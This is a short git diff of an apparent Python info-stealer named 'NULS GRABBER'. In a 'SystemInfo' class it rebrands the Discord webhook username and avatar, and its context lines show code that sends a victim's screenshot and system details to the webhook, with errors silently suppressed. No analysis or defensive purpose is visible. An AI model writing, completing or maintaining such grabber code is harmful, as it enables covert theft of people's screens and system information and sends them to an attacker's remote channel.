@@ -56,8 +56,8 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="good",
-                avatar_url="https://media.discordapp.net/attachments/608711474952798221/1093576854125957320/Gifx_2.jpg?width=265&height=265.png"
+                username="NULS GRABBER",
+                avatar_url="https://cdn.discordapp.com/attachments/1401623220041416746/1409581921402359920/ChatGPT_Image_9._Aug._2025_13_00_05.png?ex=68ade6f6&is=68ac9576&hm=70061dce2f222c512055d3ada98947814224d1e36f0c3fe7d379a01eee3a4d9d&"
             )
         except:
             pass
@@ -186,3 +186,4 @@ class SystemInfo():
             f"```{out}```",
             False
         )
+
